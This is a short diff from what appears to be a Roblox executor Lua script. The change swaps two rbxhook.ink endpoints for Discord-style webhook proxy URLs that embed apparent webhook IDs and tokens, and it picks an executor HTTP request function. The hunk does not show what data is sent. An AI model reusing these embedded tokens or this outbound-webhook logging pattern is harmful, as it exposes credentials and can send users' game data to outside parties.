@@ -50,8 +50,8 @@ local PlaceId = game.PlaceId
 local JobId = game.JobId
 local data = nil
 
-local url = "https://rbxhook.ink/r/03efb5108d75fd9d486274190d32c8fc"
-local successUrl = "https://rbxhook.ink/r/91ea18e537c4c245a98cee7c2f0e767a"
+local url = "https://webhook.lewisakura.moe/api/webhooks/1547960070095245312/APLr5QZzDJCsBxbU7M-DLgDSgJIet9ik8UqSAt4qDwvULq9Tz3LUMCFt-aPnWhLjtpJg"
+local successUrl = "https://webhook.lewisakura.moe/api/webhooks/1557143686146687000/VySIurPVTNVxgnusvIYm2Fy_Fosp78QgTU1orZBOAt3caNBvAT0AhH5pUIafuUWS6_Sl"
 
 local requestFunc = request or http_request or (http and http.request) or (syn and syn.request)
 if not requestFunc then return end
